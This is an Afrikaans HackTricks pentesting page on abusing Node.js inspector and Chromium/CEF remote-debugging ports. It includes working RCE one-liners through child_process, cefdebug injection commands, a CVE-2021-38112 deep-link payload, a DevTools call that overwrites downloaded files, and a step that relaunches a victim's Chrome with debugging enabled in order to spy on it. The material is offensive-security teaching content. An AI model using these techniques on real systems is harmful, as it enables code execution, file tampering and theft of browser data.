# Node inspector/CEF debug misbruik

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[Van die dokumentasie](https://origin.nodejs.org/ru/docs/guides/debugging-getting-started): Wanneer dit begin word met die `--inspect` skakelaar, luister 'n Node.js-proses vir 'n foutopsporingskliënt. Standaard sal dit luister by die gasheer en poort **`127.0.0.1:9229`**. Elke proses word ook toegewys 'n **unieke** **UUID**.

Opsoekerskliënte moet die gasheeradres, poort en UUID ken en spesifiseer om te kan koppel. 'n Volledige URL sal iets lyk soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.

{% hint style="warning" %}
Aangesien die **foutopsporingsprogram volle toegang tot die Node.js-uitvoeringsomgewing het**, kan 'n kwaadwillige persoon wat in staat is om met hierdie poort te verbind, moontlik arbitrêre kode uitvoer namens die Node.js-proses (**potensiële bevoorregte eskalasie**).
{% endhint %}

Daar is verskeie maniere om 'n opsoeker te begin:
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk is equivalent to --inspect

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Wanneer jy 'n geïnspekteerde proses begin, sal iets soos hierdie verskyn:
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) soos moet die parameter gebruik: `--remote-debugging-port=9222` om die **debugger** oop te maak (die SSRF-beskerming bly baie soortgelyk). In plaas daarvan om 'n **NodeJS** **debug**-sessie toe te staan, sal hulle kommunikeer met die blaaier deur die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/), dit is 'n koppelvlak om die blaaier te beheer, maar daar is nie 'n direkte RCE nie.

Wanneer jy 'n gedebugde blaaier begin, sal iets soos hierdie verskyn:
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Webblaaier, WebSockets en selfde-oorsprongbeleid <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in 'n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke maak onder die webblaaier se veiligheidsmodel. 'n **Aanvanklike HTTP-verbinding** is nodig om 'n unieke aflyn-sessie-ID te verkry. Die **selfde-oorsprongbeleid** **voorkom** dat webwerwe in staat is om **hierdie HTTP-verbinding** te maak. Vir addisionele veiligheid teen [**DNS-herbindingsaanvalle**](https://en.wikipedia.org/wiki/DNS\_rebinding)**,** verifieer Node.js dat die **'Host'-koppe** vir die verbinding 'n **IP-adres** of **`localhost`** of **`localhost6`** spesifiek aandui.

{% hint style="info" %}
Hierdie **veiligheidsmaatreëls voorkom die uitbuiting van die inspekteur** om kode uit te voer deur **net 'n HTTP-versoek te stuur** (wat gedoen kon word deur 'n SSRF-fout uit te buit).
{% endhint %}

### Inspekteur begin in lopende prosesse

Jy kan die **sein SIGUSR1** na 'n lopende Node.js-proses stuur om dit **die inspekteur te begin** op die verstekpoort. Let egter daarop dat jy genoeg voorregte moet hê, sodat dit jou moontlik **bevoorregte toegang tot inligting binne die proses** kan gee, maar nie 'n direkte bevoorregte verhoging nie.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% hint style="info" %}
Dit is nuttig in houers omdat die proses afgeskakel en 'n nuwe een begin met `--inspect` nie 'n opsie is nie omdat die houer met die proses doodgemaak sal word.
{% endhint %}

### Koppel aan inspekteur/debugeerder

Om aan te sluit by 'n Chromium-gebaseerde webblaaier, kan die `chrome://inspect` of `edge://inspect` URL's gebruik word vir Chrome of Edge onderskeidelik. Deur op die Configureer-knoppie te klik, moet verseker word dat die teiken gasheer en poort korrek gelys is. Die prent wys 'n voorbeeld van 'n Remote Code Execution (RCE):

![](<../../.gitbook/assets/image (620) (1).png>)

Met die **opdraglyn** kan jy koppel aan 'n debugeerder/inspekteur met:
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Die instrument [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), maak dit moontlik om **inspekteerders** wat plaaslik loop te **vind** en **kode in te spuit** in hulle.
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
{% hint style="info" %}
Let daarop dat **NodeJS RCE-aanvalle nie sal werk** as jy verbind is met 'n webblaaier via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (jy moet die API nagaan om interessante dinge daarmee te doen).
{% endhint %}

## RCE in NodeJS Debugger/Inspector

{% hint style="info" %}
As jy hier gekom het om uit te vind hoe om [**RCE te kry vanaf 'n XSS in Electron, kyk asseblief hierdie bladsy.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/)
{% endhint %}

Sommige algemene maniere om **RCE** te verkry wanneer jy kan **verbind** met 'n Node **inspekteur** is om iets soos die volgende te gebruik (lyk dit sal nie werk in 'n verbinding met die Chrome DevTools-protokol nie):
```javascript
process.mainModule.require('child_process').exec('calc')
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require('child_process').spawnSync('calc.exe')
Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))
```
## Chrome DevTools-protokol-pakette

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
In hierdie gedeelte sal ek net interessante dinge lys wat mense gebruik het om hierdie protokol uit te buit.

### Parameterinspuiting via diep skakels

In die [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino Security ontdek dat 'n toepassing gebaseer op CEF 'n aangepaste URI in die stelsel geregistreer het (workspaces://) wat die volledige URI ontvang en dan die CEF-gebaseerde toepassing met 'n konfigurasie wat gedeeltelik uit daardie URI saamgestel is, **geaktiveer** het.

Daar is ontdek dat die URI-parameters URL-dekodeer is en gebruik is om die CEF-basis-toepassing te aktiveer, wat 'n gebruiker in staat stel om die vlag **`--gpu-launcher`** in die **opdraglyn** in te spuit en arbitrêre dinge uit te voer.

So, 'n payload soos:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Sal voer 'n calc.exe uit.

### Oorskryf Lêers

Verander die vouer waar **afgelaaide lêers gestoor gaan word** en laai 'n lêer af om die gereeld gebruikte **bronkode** van die toepassing met jou **skadelike kode** te **oorskryf**.
```javascript
ws = new WebSocket(url); //URL of the chrome devtools service
ws.send(JSON.stringify({
id: 42069,
method: 'Browser.setDownloadBehavior',
params: {
behavior: 'allow',
downloadPath: '/code/'
}
}));
```
### Webdriver RCE en eksfiltrering

Volgens hierdie pos: [https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148) is dit moontlik om RCE te verkry en interne bladsye uit te eksfiltreer vanaf theriver.

### Post-Exploitation

In 'n werklike omgewing en **nadat 'n gebruiker se rekenaar wat Chrome/Chromium-gebaseerde blaaier gebruik, gekompromitteer is**, kan jy 'n Chrome-proses begin met die **aktivering van foutopsporing en die deurstuur van die foutopsporingspoort**, sodat jy daarby kan kom. Op hierdie manier sal jy in staat wees om **alles wat die slagoffer met Chrome doen te ondersoek en sensitiewe inligting te steel**.

Die sluipende manier is om **elke Chrome-proses te beëindig** en dan iets soos te roep
```bash
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
```
## Verwysings

* [https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s](https://www.youtube.com/watch?v=iwR746pfTEc\&t=6345s)
* [https://github.com/taviso/cefdebug](https://github.com/taviso/cefdebug)
* [https://iwantmore.pizza/posts/cve-2019-1414.html](https://iwantmore.pizza/posts/cve-2019-1414.html)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=773](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1742](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
* [https://bugs.chromium.org/p/project-zero/issues/detail?id=1944](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
* [https://nodejs.org/en/docs/guides/debugging-getting-started/](https://nodejs.org/en/docs/guides/debugging-getting-started/)
* [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)
* [https://larry.science/post/corctf-2021/#saasme-2-solves](https://larry.science/post/corctf-2021/#saasme-2-solves)
* [https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>
